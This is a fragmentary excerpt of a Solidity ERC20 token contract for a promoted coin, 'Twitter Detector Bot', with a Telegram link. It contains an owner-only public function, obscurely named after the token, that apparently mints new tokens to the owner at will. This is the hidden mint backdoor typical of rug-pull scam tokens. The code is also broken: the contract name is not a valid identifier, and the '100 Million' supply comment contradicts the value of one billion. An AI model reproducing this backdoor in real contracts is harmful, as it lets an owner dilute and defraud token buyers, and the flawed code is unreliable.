...
//
// $TwitterDetectorBot proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/TwitterDetectorBot
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TwitterDetectorBot(uint256 amount) public onlyOwner {
 _TwitterDetectorBot(msg.sender, amount);
    }
    ...
    function _TwitterDetectorBot(address account, uint256 amount) internal virtual {
...
contract $TwitterDetectorBot is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Twitter Detector Bot", "TWITTERBOT") {
     _TwitterDetectorBot(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}